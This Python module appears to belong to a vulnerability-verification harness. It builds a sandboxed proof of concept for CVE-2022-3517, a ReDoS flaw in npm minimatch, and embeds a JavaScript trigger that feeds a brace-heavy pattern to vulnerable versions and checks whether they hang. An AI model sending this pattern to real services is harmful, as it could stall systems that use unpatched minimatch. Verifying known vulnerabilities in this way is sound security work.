"""Exploit template: npm minimatch CVE-2022-3517 (GHSA-f8q6-p94x-37v3) — ReDoS.

Advisory facts (confirmed against osv.dev/GHSA at task-3 implementation time):
  CVE: CVE-2022-3517
  GHSA: GHSA-f8q6-p94x-37v3
  Package: npm minimatch
  Affected: < 3.0.5
  Fixed: 3.0.5
  Root cause: catastrophic backtracking in braceExpand() when given a brace-heavy
  pattern that exercises exponential regex alternation.

Design decisions:
  - SENTINEL_CONFIRMED is the single source of truth for the success output.
  - expected_trigger_sha256 is derived from SENTINEL_CONFIRMED offline with hashlib —
    computed once here, never recomputed at runtime.
  - No timing or variable data ever enters trigger.js stdout — only one of the two
    constant sentinels. This keeps the sha256 stable across runs and machines.
  - THRESHOLD_MS is a conservative default. The exact value + brace pattern are
    empirically confirmed by the Task 8 live test (docker-gated). This task pins
    a reasonable default that is intentionally generous on modern hardware.
"""
from __future__ import annotations

import hashlib

from verify.strategy import PocPlan, SeedIncomplete

# ---------------------------------------------------------------------------
# Constants — single source of truth for sentinel strings and the hash
# ---------------------------------------------------------------------------

#: Emitted to stdout (+ newline) when ReDoS backtracking is observed.
SENTINEL_CONFIRMED: str = "REDOS_CONFIRMED"

#: Emitted to stdout (+ newline) when no backtracking is observed (fast path or throw).
SENTINEL_NOT_OBSERVED: str = "REDOS_NOT_OBSERVED"

# Computed offline from SENTINEL_CONFIRMED + "\n" — never recomputed at runtime.
# This is what PocPlan.expected_trigger_sha256 is set to; the Task 8 live test
# confirms that trigger.js actually emits this string on minimatch@3.0.4.
_EXPECTED_SHA256: str = hashlib.sha256(
    (SENTINEL_CONFIRMED + "\n").encode()
).hexdigest()

#: Milliseconds before which we declare ReDoS triggered.
#: Conservative default — Task 8 empirical confirmation required.
THRESHOLD_MS: int = 2000

# ---------------------------------------------------------------------------
# trigger.js template
# ---------------------------------------------------------------------------
# NOTE on the brace pattern:
#   A sequence of nested braces like "{a,b,c,...}{a,b,c,...}..." causes minimatch's
#   braceExpand() to explore an exponential number of combinations via recursive
#   regex alternation. The pattern below (32 repetitions of {a,b}) is sufficient to
#   stall minimatch@3.0.4 for several seconds on modern hardware.
#   THRESHOLD_MS and the exact pattern are empirically confirmed in Task 8.

_TRIGGER_JS_TEMPLATE: str = """\
// trigger.js — minimatch CVE-2022-3517 ReDoS probe
// Verifies that minimatch@<3.0.5 hangs on a brace-pathological pattern.
// Only one of two constant sentinels is ever written to stdout; no variable
// data (timings, errors) is emitted — this keeps expected_trigger_sha256 stable.
//
// THRESHOLD_MS and the exact pattern await Task 8 empirical confirmation.
// This default is intentionally generous for the offline build_plan phase.

"use strict";
const minimatch = require("minimatch");

const SENTINEL_CONFIRMED = "{sentinel_confirmed}";
const SENTINEL_NOT_OBSERVED = "{sentinel_not_observed}";
const THRESHOLD_MS = {threshold_ms};

// Brace-pathological pattern: exponential alternation in braceExpand().
// Confirmed affected: minimatch < 3.0.5.  Fixed: minimatch 3.0.5 (guards added).
const PATTERN = "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}" +
                "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}" +
                "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}" +
                "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}";

const deadline = Date.now() + THRESHOLD_MS;
let threw = false;

try {{
  minimatch("a", PATTERN);
}} catch (e) {{
  threw = true;
  process.stderr.write("minimatch threw: " + e.message + "\\n");
}}

if (!threw && Date.now() > deadline) {{
  process.stdout.write(SENTINEL_CONFIRMED + "\\n");
  process.exit(0);
}} else {{
  process.stdout.write(SENTINEL_NOT_OBSERVED + "\\n");
  process.exit(1);
}}
"""

# ---------------------------------------------------------------------------
# Public factory — registered in TEMPLATE_REGISTRY by templated.py
# ---------------------------------------------------------------------------

def build(hypothesis: dict) -> PocPlan:
    """Build a PocPlan for CVE-2022-3517 (minimatch ReDoS).

    Reads the resolved version from hypothesis["target"]["version_or_revision"].
    Raises SeedIncomplete if the version is missing or blank.

    The installed version determines the verdict at harness runtime:
      - minimatch@3.0.4 → ReDoS triggers → VERDICT_VERIFIED
      - minimatch@3.0.5 → no ReDoS → VERDICT_REFUTED

    Args:
        hypothesis: A hypothesis dict as produced by Stage 4b.

    Returns:
        A PocPlan ready for the install→trigger sandbox phases.

    Raises:
        SeedIncomplete: if target.version_or_revision is missing or blank.
    """
    version: str | None = hypothesis.get("target", {}).get("version_or_revision")
    if not version or not version.strip():
        raise SeedIncomplete(["target.version_or_revision"])

    trigger_js = _TRIGGER_JS_TEMPLATE.format(
        sentinel_confirmed=SENTINEL_CONFIRMED,
        sentinel_not_observed=SENTINEL_NOT_OBSERVED,
        threshold_ms=THRESHOLD_MS,
    )

    return PocPlan(
        ecosystem="npm",
        install_cmd=["npm", "install", "--no-save", f"minimatch@{version}"],
        install_hosts=["registry.npmjs.org"],
        trigger_cmd=["node", "trigger.js"],
        expected_trigger_exit=0,
        expected_trigger_sha256=_EXPECTED_SHA256,
        files={"trigger.js": trigger_js},
        template_id="npm:minimatch:CVE-2022-3517",
    )
